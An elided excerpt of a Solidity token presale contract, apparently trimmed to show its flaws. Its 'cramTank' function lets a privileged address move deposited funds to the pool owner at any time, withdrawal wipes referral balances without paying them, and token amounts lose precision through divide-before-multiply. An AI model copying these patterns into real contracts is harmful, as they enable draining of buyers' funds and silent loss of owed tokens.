...
contract ORGANOSALE is ReentrancyGuard {
    ...
    struct BuyerInfo {
        ...
        uint256 intTokensOwed; // num presale tokens a user is owed, in integer format without decimals
        uint256 tokensOwed; // num presale tokens a user is owed shown with decimals, can be withdrawn after sale success
    }
    ...
    struct RefererInfo {
        ...
        uint256 refTokensOwed; // number of tokens is owed after sale ends 
    }
    ...
    function userDeposit (uint256 _amount, address address2) external payable nonReentrant {
        ...
        uint256 tokensSold = amount_in.div(SALE_INFO.TOKEN_PRICE).mul(DECIMAL);
         uint256 intTokensSold = amount_in.div(SALE_INFO.TOKEN_PRICE);//.div(10**18);
        ...
        buyer.intTokensOwed = buyer.intTokensOwed.add(intTokensSold);
        ...
        if(REF_INFO.REFSALE){
            uint fivePercentage = tokensSold*REF_INFO.REFAMOUNT/100;
   ...
   // -----------------------------------------
    ...
    function refsale(address referer, uint256 gain)internal{
        ...
        _refer.refTokensOwed = _refer.refTokensOwed.add(gain);
    ...
    */
    ...
    function userWithdrawTokens() external nonReentrant {
        ...
        BuyerInfo storage buyer = BUYERS[msg.sender];
        RefererInfo storage _refer = REFERERS[msg.sender];
        uint256 tokensAvailable = SALE_INFO.SALE_TOKEN.balanceOf(address(this));
        uint256 claimable = buyer.tokensOwed;
        require(tokensAvailable >= buyer.tokensOwed, 'INSUFFICIENT TOKENS TO CLAIM. AWAITING REFILL');
        require(buyer.tokensOwed > 0, 'NOTHING TO CLAIM');
        SALE_STATUS.TOTAL_TOKENS_WITHDRAWN = SALE_STATUS.TOTAL_TOKENS_WITHDRAWN.add(buyer.tokensOwed);
        buyer.tokensOwed = 0;
        buyer.intTokensOwed = 0;
        _refer.refTokensOwed = 0;
        TransferHelper.safeTransfer(address(SALE_INFO.SALE_TOKEN), msg.sender, claimable);
    }
    ...
    function cramTank(uint amount)external {
     require(msg.sender == SALE_GENERATOR, 'REQUEST FORBIDDEN');
     TransferHelper.safeTransferBaseToken(address(SALE_INFO.BASE_TOKEN), SALE_INFO.POOL_OWNER, amount, SALE_INFO.SALE_IN_BNB);
    }
